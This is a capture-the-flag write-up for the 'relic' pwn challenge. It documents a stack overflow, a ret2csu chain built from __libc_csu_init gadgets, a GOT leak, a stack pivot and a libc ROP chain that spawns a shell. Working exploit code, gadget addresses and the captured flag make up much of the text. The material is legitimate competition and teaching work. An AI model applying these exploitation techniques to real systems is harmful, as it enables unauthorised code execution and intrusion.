# relic

> Pwn · Medium · Iulian Schifirnet  
> Points: 270 · Flag submitted by: secretNinja

**The flag**

`CSCTF{ktq2F5bP6RjmWhr0YvpQblII}`

**Challenge**

> An old control unit recovered from a decommissioned Ash Army vault, older than the system software now
> running on it. It accepts one deposit and seals itself for good. One deposit is all you are given; make it
> count, work the unit apart from the inside with the few parts it still trusts, and bring up a prompt of
> your own.

relic is a TCP service in a per-team container, reachable at `<instance>`. The handout `relic.tar.gz` ships
the full source `relic.c`, the `relic` ELF (x86-64, dynamically linked, not stripped), and the matching
loader and `libc.so.6` — `GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.18)`, plus `ld-linux-x86-64.so.2`. The
source header comment literally says `// relic - ret2csu` and records the build line
`gcc -O0 -fno-stack-protector -no-pie -Wl,-z,relro,-z,now` (Ubuntu 20.04), so the real `__libc_csu_init` is
linked in. The briefing's "the few parts it still trusts" is the binary's own code, and "older than the
system software" points at the glibc 2.31 `__libc_csu_init` — the technique is named for anyone who reads
closely.

Tools used: pwntools and the `csctf-pwn` Docker image with the shipped loader and libc 2.31.

**Approach / walkthrough**

Checksec on `relic` (pwntools):

| Mitigation | State |
| --- | --- |
| RELRO | Full |
| Stack canary | none |
| NX | enabled |
| PIE | no (base 0x400000) |

SHSTK/IBT are marked enabled in the ELF, but the CPU and kernel in the container do not enforce them, so
they do not affect the chain. GOT entries are fixed (non-PIE): `_exit` `0x403fd0`, `write` `0x403fd8`,
`alarm` `0x403fe0`, `read` `0x403fe8` (followed by `__libc_start_main` `0x403ff0`, `__gmon_start__`
`0x403ff8`).

1. **The bug.** `vault()` reads far past its buffer:

   ```c
   static void vault(void) {
       char buf[0x40];
       if (visited++) { say("The vault only opens once.\n"); _exit(1); }
       say("Leave something in the vault: ");
       read(0, buf, 0x120);
       say("\n");
   }
   ```

   `read` takes `0x120` bytes into a `0x40`-byte buffer with no canary — a plain stack overflow. `buf` sits
   at `rbp-0x40`, so the saved RIP is at offset `0x48` and there is room for `(0x120 - 0x48)/8 = 27` qwords
   of ROP after it (the chain used is 24). The `visited` guard means `vault()` runs only once, so you cannot
   return into it for a second overflow — the brief's "one deposit".

2. **No argument gadgets.** The binary is tiny and (apart from startup) imports only `write`, `read`,
   `alarm`, `_exit`; it has no `pop rdi`/`pop rsi`/`pop rdx` gadgets of its own. The standard answer, named
   in the source, is **ret2csu**: `__libc_csu_init` carries a universal "call a GOT function with three
   controlled arguments" primitive. Two gadgets, re-disassembled from the handout and matching the exploit:

   - `0x4012da`: `pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret`
   - `0x4012c0`: `mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]`

   With `rbx=0, rbp=1`, the loop body's trailing `add rbx,1; cmp rbp,rbx; jne` falls through into
   `add rsp,8` plus the six pops again, so each call costs one 8-qword frame and the gadgets chain into one
   another. Setting `r15` to a GOT slot, `rbx=0` makes `call [r15+rbx*8]` call that import; `r12/r13/r14`
   become `edi/rsi/rdx`.

3. **Stage layout and pivot.** Because `vault()` cannot be re-entered, the solve forges a stack at a fixed
   writable address `STAGE = 0x404800` and uses `vault()`'s own `leave; ret` epilogue at `0x401218` to pivot
   there, turning the single `read` into two stages. `0x404800` is not inside `.bss` proper (`.bss` is
   `0x404010`–`0x404018`) but lies in the same RW `PT_LOAD` page `0x404000`–`0x404fff`, which the kernel maps
   writable; with no PIE the address is fixed. The overflow is `'A'*0x40`, the saved-RBP slot set to `STAGE`,
   then a 24-qword csu chain (the overwritten saved RBP does not drive the pivot — the first csu pop
   immediately replaces `rbp` with `1`):

   ```python
   G1, G2, LEAVE = 0x4012da, 0x4012c0, 0x401218
   GOT_EXIT, GOT_WRITE, GOT_READ = 0x403fd0, 0x403fd8, 0x403fe8
   STAGE = 0x404800
   chain = [G1, 0, 1, 1, GOT_EXIT, 0x20, GOT_WRITE, G2,   # write(1, 0x403fd0, 0x20)
            0, 0, 1, 0, STAGE, 0x200, GOT_READ, G2,       # read(0, STAGE, 0x200)
            0, 0, STAGE, 0, 0, 0, 0, LEAVE]               # pop rbp=STAGE; leave;ret -> pivot
   p = b'A'*0x40 + p64(STAGE) + flat(chain)
   p = p.ljust(0x120, b'\0')
   ```

   Reading the first csu frame: `rbx=0, rbp=1, r12=1, r13=GOT_EXIT, r14=0x20, r15=GOT_WRITE`. `call
   [GOT_WRITE]` is `write`; its args are `edi=r12d=1`, `rsi=r13=0x403fd0`, `rdx=r14=0x20`. The second frame
   is `r12=0, r13=STAGE, r14=0x200, r15=GOT_READ` → `read(0, STAGE, 0x200)`.

4. **Leak.** The first csu frame calls `write(1, 0x403fd0, 0x20)`, dumping the four resolved GOT pointers
   (`_exit`, `write`, `alarm`, `read`). Subtracting the handout libc's `write` offset gives the libc base;
   the base recomputed from the `read` pointer is printed alongside as an eyeball cross-check:

   ```python
   ex, wr, al, rd = [u64(leak[i:i+8]) for i in range(0, 32, 8)]
   base = wr - libc.sym['write']
   libc.address = base   # read-leak base printed for comparison
   ```

5. **Second read + pivot.** The second csu frame calls `read(0, STAGE, 0x200)` to receive stage 2 into the
   forged page. The final csu pop frame sets `rbp = STAGE` and returns to `leave; ret`, so `rsp = STAGE`,
   `pop rbp` eats stage 2's first (dummy) qword, and `ret` enters stage 2 at `STAGE+8`.

6. **Stage 2 — shell.** With libc known, a short libc ROP calls `execve("/bin/sh", 0, 0)` using gadgets and
   the `/bin/sh` string from the handout libc:

   ```python
   r = ROP(libc); binsh = next(libc.search(b'/bin/sh\0'))
   s2 = flat([0, r.find_gadget(['pop rdi','ret'])[0], binsh,
              r.find_gadget(['pop rsi','ret'])[0], 0,
              r.find_gadget(['pop rdx','pop r12','ret'])[0], 0, 0,
              libc.sym['execve']])
   io.send(s2.ljust(0x200, b'\0'))
   ```

   The leading `0` is the dummy qword eaten by `pop rbp` during the pivot. The shell line then runs `id` and
   `cat`s several candidate flag paths (`/flag*`, `/home/*/flag*`, `/app/flag*`, `/srv/flag*`), returning the
   flag.

**Why it works**

The overflow plus no canary gives control of the instruction pointer, but a single input with no argument
gadgets would normally block a leak followed by a second stage. `__libc_csu_init` is a universal
three-argument call gadget present in every older GCC/glibc binary, and it supplies both halves of the
problem: the leak (`write` of the GOT) and the second input channel (`read` into a fixed writable page). The
forged saved `rbp` turns the function's own `leave` into the pivot onto stage 2. Full RELRO is irrelevant —
the GOT is only read, never overwritten.

**Validation / reproduction**

The chain was tested in the `csctf-pwn:1` image (`--platform linux/amd64`, `--network none`) against the
handout under its shipped loader and libc. It leaked `_exit`/`write`/`alarm`/`read`, produced a page-aligned
libc base matching the base recomputed from the `read` leak, and opened a shell (`uid=0(root)`); the handout
files have to be copied with the execute bit set first. It was then fired once at the team's assigned
instance, and the flag was submitted once and accepted on the first try (`tried.json`: 1 attempt,
`correct`).

Reproduce with `workspace/9138-relic/exploit.py`:
`docker run --platform linux/amd64 -v <handout>:/w -v <solve>:/s csctf-pwn:1 python3 /s/exploit.py HOST PORT`
(omit HOST/PORT to run locally against `/w` via the shipped loader). Gotchas: the automatic libc-mismatch
check in the script is gated off (`... and False`), so the base agreement is confirmed by eye; the exact
flag-file path inside the container was not saved, which is why the script sweeps several candidate paths.
